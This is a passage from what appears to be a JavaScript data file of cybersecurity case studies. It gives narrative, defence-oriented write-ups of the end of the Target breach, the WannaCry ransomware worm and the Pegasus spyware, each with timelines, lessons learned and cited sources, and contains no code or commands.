    { t: "27 Nov 2013", d: "Memory-scraping malware (BlackPOS variant) is installed on POS terminals. Black Friday — the busiest shopping day of the year." },
    { t: "2–15 Dec 2013", d: "Card data is exfiltrated to staging servers inside Target's network, then to external servers." },
    { t: "12 Dec 2013", d: "The Department of Justice notifies Target of the breach." },
    { t: "19 Dec 2013", d: "Target publicly discloses the breach." }
  ] },

  { h: "Why the network allowed it" },
  { p: "The fundamental failure was that Target's network did not adequately segment vendor access from payment systems. An HVAC contractor's credentials should never have provided a path — direct or indirect — to point-of-sale terminals." },
  { l: [
   "**No meaningful segmentation.** The vendor portal and POS systems were reachable through the same network, allowing lateral movement.",
   "**Vendor credentials had excessive access.** The credentials were not scoped to the minimum required systems.",
   "**POS systems were Windows-based and not hardened.** They ran standard Windows XP Embedded, making malware installation straightforward.",
   "**Exfiltration used Target's own infrastructure.** Data was staged on internal servers before being sent to external drop sites, blending with normal traffic."
  ] },
  { n: "Target had deployed FireEye's malware detection system, which identified the BlackPOS malware and generated alerts. The security team in Bangalore escalated the alerts to the Minneapolis team. No action was taken. The technology worked. The process around it did not.",
    nt: "The alarm went off and was ignored" },

  { h: "What changed" },
  { l: [
   "**Third-party risk management** became a standard security practice. Vendor access is now audited, scoped and segmented from sensitive systems.",
   "**Network segmentation** for PCI (Payment Card Industry) compliance was tightened. Cardholder data environments must be isolated.",
   "**EMV chip cards** were accelerated in the US. Chip cards are resistant to the RAM-scraping technique because the card data is encrypted differently.",
   "**The CISO role gained authority.** Target's CIO and CEO resigned. The breach demonstrated that security failures have C-suite consequences.",
   "Total costs exceeded $200 million, including an $18.5 million multistate settlement."
  ] }
 ],
 k: [
  "Third-party vendor access is an attack surface — every vendor with network access is an entry point.",
  "Network segmentation is not optional: billing systems and payment terminals must not share a flat network.",
  "Detection that generates alerts nobody acts on is indistinguishable from no detection.",
  "The weakest link was not Target's code — it was a small contractor's email security."
 ],
 r: ["Defence in Depth", "Zero Trust", "Principle of Least Privilege", "Endpoint", "Monitoring", "Incident Response", "Encryption"],
 src: [
  { t: "US Senate Committee — A 'Kill Chain' Analysis of the 2013 Target Data Breach", u: "https://www.commerce.senate.gov/services/files/24d3c229-4f2f-405d-b8db-a3a67f183883" },
  { t: "Krebs on Security — A First Look at the Target Intrusion, Malware", u: "https://krebsonsecurity.com/2014/01/a-first-look-at-the-target-intrusion-malware/" }
 ]
},

{
 t: "WannaCry",
 s: "An NSA exploit, leaked, then weaponised worldwide",
 y: 2017, when: "12 May 2017",
 g: ["ransomware", "smb", "patching", "nsa"],
 tldr: "A ransomware worm combined EternalBlue — an NSA exploit for a Windows SMB vulnerability, leaked by the Shadow Brokers group — with a self-propagating mechanism that spread across networks without user interaction. In a single day it infected over 200,000 machines in 150 countries, crippling the UK's National Health Service, Telefónica, FedEx, Renault and many others. A security researcher accidentally found a kill switch — a domain name the malware checked before executing — and registered it, dramatically slowing the spread.",
 say: [
  "EternalBlue was an NSA exploit for a Windows SMB vulnerability. Microsoft had patched it two months before WannaCry, but many organisations had not applied the patch.",
  "It spread without user interaction — no phishing email, no clicked link. If your machine was reachable on SMB and unpatched, it was compromised.",
  "The kill switch was a domain name the malware queried before encrypting. Marcus Hutchins registered it on a hunch, which stopped most new infections.",
  "It hit the UK NHS hardest — hospitals diverted ambulances and cancelled surgeries because their systems were locked."
 ],
 b: [
  { h: "The exploit chain" },
  { p: "In April 2017, a group called the Shadow Brokers publicly released a collection of tools believed to have been stolen from the NSA's Tailored Access Operations unit. Among them was **EternalBlue**, an exploit for CVE-2017-0144 — a vulnerability in Windows' SMBv1 protocol that allowed remote code execution without authentication." },
  { p: "Microsoft had released patch MS17-010 in March 2017 — one month before the leak and two months before WannaCry. The patch was available. Many organisations, particularly those running Windows XP or with slow patching cycles, had not applied it." },

  { h: "The worm" },
  { p: "WannaCry combined EternalBlue with a self-propagating worm mechanism. Once it compromised a machine, it scanned the local network and the internet for other machines with open SMB ports, exploited them, and spread. No user interaction was required." },
  { l: [
   "**Encryption.** On each compromised machine, WannaCry encrypted files with RSA-2048 and AES-128, appending `.WNCRY` to filenames.",
   "**Ransom demand.** A screen demanded $300–$600 in Bitcoin for the decryption key.",
   "**Propagation.** The worm component continuously scanned for vulnerable machines. Inside corporate networks with flat topologies, it spread in minutes.",
   "**Scale.** Within hours, over 200,000 machines in 150 countries were infected."
  ] },

  { h: "The kill switch" },
  { p: "Marcus Hutchins (MalwareTech), a 22-year-old security researcher in the UK, was analysing the malware and noticed it made an HTTP request to a specific unregistered domain name before executing. If the domain responded, the malware halted." },
  { n: "Hutchins registered the domain for about $10.69, expecting it to be a sinkhole for command-and-control traffic. It immediately started receiving hundreds of thousands of connections per second from infected machines worldwide — and new infections effectively stopped. The domain check was likely a sandbox evasion technique (sandbox environments often resolve all domains), accidentally creating a global kill switch.",
    nt: "A $10.69 domain saved billions" },
  { tl: [
    { t: "12 May 2017, morning", d: "WannaCry begins spreading. Telefónica in Spain is among the first major victims." },
    { t: "12 May, midday", d: "UK NHS hospitals are hit. Emergency departments divert patients. Surgeries are cancelled." },
    { t: "12 May, afternoon", d: "Hutchins registers the kill switch domain. New infections slow dramatically." },
    { t: "Following days", d: "Variants without the kill switch appear but spread less effectively." },
    { t: "Dec 2017", d: "The US, UK and others formally attribute WannaCry to North Korea's Lazarus Group." }
  ] },

  { h: "What changed" },
  { l: [
   "**Patching urgency.** The patch had been available for two months. The incident made 'patch now' a business-level conversation, not just an IT request.",
   "**Windows XP end-of-life was taken seriously.** Microsoft issued an emergency patch for XP, which had been out of support for three years.",
   "**SMBv1 was widely disabled.** The protocol was already deprecated; WannaCry gave organisations the push to actually turn it off.",
   "**The debate over government exploit stockpiling intensified.** If the NSA had disclosed the vulnerability instead of weaponising it, the patch would have existed even earlier.",
   "**Network segmentation** became critical — organisations with flat networks lost everything; segmented ones contained the blast radius."
  ] }
 ],
 k: [
  "A patch that exists but is not applied provides zero protection.",
  "Self-propagating malware on a flat network turns one compromised machine into a total compromise in minutes.",
  "Government exploit stockpiling creates risk for everyone when the exploits inevitably leak.",
  "A kill switch found by accident is not a security strategy — but it saved billions of dollars."
 ],
 r: ["CVE", "Zero-Day", "Encryption", "Operating System", "Defence in Depth", "Incident Response", "Endpoint"],
 src: [
  { t: "Microsoft — Customer Guidance for WannaCrypt attacks", u: "https://msrc-blog.microsoft.com/2017/05/12/customer-guidance-for-wannacrypt-attacks/" },
  { t: "MalwareTech — How I accidentally stopped a global cyber attack (Marcus Hutchins)", u: "https://www.malwaretech.com/2017/05/how-to-accidentally-stop-a-global-cyber-attacks.html" }
 ]
},

{
 t: "The Pegasus Spyware",
 s: "Zero-click, zero-day, zero chance",
 y: 2021, when: "2016–2021",
 g: ["mobile security", "zero-click", "surveillance", "zero-day"],
 tldr: "NSO Group, an Israeli surveillance company, built Pegasus — spyware that could fully compromise an iPhone or Android device with no user interaction at all. Zero-click exploits delivered via iMessage or WhatsApp silently installed the spyware, which could then access messages, calls, camera, microphone, location and passwords. Investigations by Citizen Lab and the Pegasus Project revealed it had been used against journalists, activists, lawyers and heads of state in at least 45 countries.",
 say: [
  "Zero-click means no phishing, no clicked link, no user action at all. Receiving an iMessage was enough.",
  "It exploited a chain of zero-days in iOS — including a vulnerability in the iMessage image parser that Apple did not know about.",
  "Once installed, it had full access: messages, calls, camera, microphone, passwords, location, even encrypted app content.",
  "It forced Apple to build an entirely new security mode (Lockdown Mode) and fundamentally changed how mobile OS security is designed."
 ],
 b: [
  { h: "How it worked" },
  { p: "Traditional spyware requires the target to click a malicious link or install a compromised app. Pegasus eliminated that requirement entirely." },
  { l: [
   "**Zero-click delivery.** An invisible iMessage was sent to the target's phone. The message contained a specially crafted PDF or image that triggered a vulnerability in the message parser.",
   "**Exploit chain.** The initial vulnerability provided code execution in the iMessage sandbox. Additional exploits escaped the sandbox, escalated privileges, and gained kernel access.",
   "**Full device access.** With kernel-level control, Pegasus could read all messages (including Signal and WhatsApp), activate the camera and microphone, track location, extract passwords from the keychain, and capture screen content.",
   "**Anti-forensics.** Pegasus ran in memory where possible, leaving minimal traces on disk. On reboot, it would re-infect via a persistent mechanism or be re-delivered."
  ] },
  { n: "The iMessage exploit chain (FORCEDENTRY, discovered in 2021) exploited a vulnerability in Apple's CoreGraphics PDF parser. The attacker constructed a PDF that used JBIG2-encoded data to build a small computer architecture within the decompression logic — effectively creating a virtual machine inside the image parser to execute arbitrary code. Google Project Zero called it one of the most technically sophisticated exploits they had ever analysed.",
    nt: "A computer inside a PDF parser" },

  { h: "Scale of deployment" },
  { p: "In July 2021, the **Pegasus Project** — a consortium of 17 media organisations coordinated by Forbidden Stories, with technical analysis by Amnesty International's Security Lab — revealed a leaked list of approximately 50,000 phone numbers selected as potential surveillance targets." },
  { l: [
   "Targets included journalists, human rights activists, lawyers, and political figures in at least 45 countries.",
   "Confirmed targets included heads of state — French President Macron's phone number was on the list.",
   "NSO Group maintained that it sold only to governments for lawful surveillance of criminals and terrorists.",
   "Multiple governments were implicated in using it against domestic dissidents and press."
  ] },
  { tl: [
    { t: "2016", d: "Citizen Lab at the University of Toronto discovers the first Pegasus sample, targeting UAE dissident Ahmed Mansoor." },
    { t: "2019", d: "WhatsApp sues NSO Group after Pegasus is delivered via WhatsApp voice calls (the target did not need to answer)." },
    { t: "Sep 2021", d: "Apple patches FORCEDENTRY (CVE-2021-30860) after Citizen Lab reports the zero-click iMessage exploit." },
    { t: "Nov 2021", d: "The US places NSO Group on the Entity List, restricting US technology exports to it." },
    { t: "2022", d: "Apple introduces Lockdown Mode — a hardened configuration that disables attack surfaces like iMessage link previews." }
  ] },

  { h: "What it means for engineers" },
  { l: [
   "**Attack surface reduction matters.** Every feature that processes untrusted input is an attack surface. iMessage's rich preview of images and links is a convenience feature that became an exploitation path.",
   "**Memory safety is a security property.** The exploited vulnerabilities were in C/C++ parsing code. Memory-safe languages eliminate this class of bug.",
   "**Sandboxing is necessary but insufficient.** The iMessage sandbox contained the initial exploit; additional exploits escaped it. Defence in depth means assuming each layer will be broken.",
   "**Zero-day economics are real.** NSO Group reportedly charged governments $500,000 per target. At that price point, finding zero-days is a business, not a hobby.",
   "**Apple's Lockdown Mode** is the first mainstream acknowledgement that maximum security requires reducing functionality — turning off features to reduce attack surface."
  ] }
 ],
 k: [
  "Zero-click means the target cannot protect themselves through behaviour — the device is compromised by receiving a message.",
  "Every parser that processes untrusted input is an attack surface, and the more complex the format, the larger the surface.",
  "The market for zero-day exploits is a mature industry with nation-state customers and six-figure prices.",
  "Defence in depth must assume each layer will be breached — sandbox escape is a standard exploit technique."
 ],
 r: ["Zero-Day", "Sandboxing", "Memory Safety", "Encryption", "Authentication", "Endpoint", "Defence in Depth"],
 src: [
  { t: "Citizen Lab — The Million Dollar Dissident: NSO Group's iPhone Zero-Days used against a UAE Human Rights Defender", u: "https://citizenlab.ca/2016/08/million-dollar-dissident-iphone-zero-day-nso-group-uae/" },
  { t: "Google Project Zero — A deep dive into an NSO zero-click iMessage exploit (FORCEDENTRY)", u: "https://googleprojectzero.blogspot.com/2021/12/a-deep-dive-into-nso-zero-click.html" }
 ]
}

]);
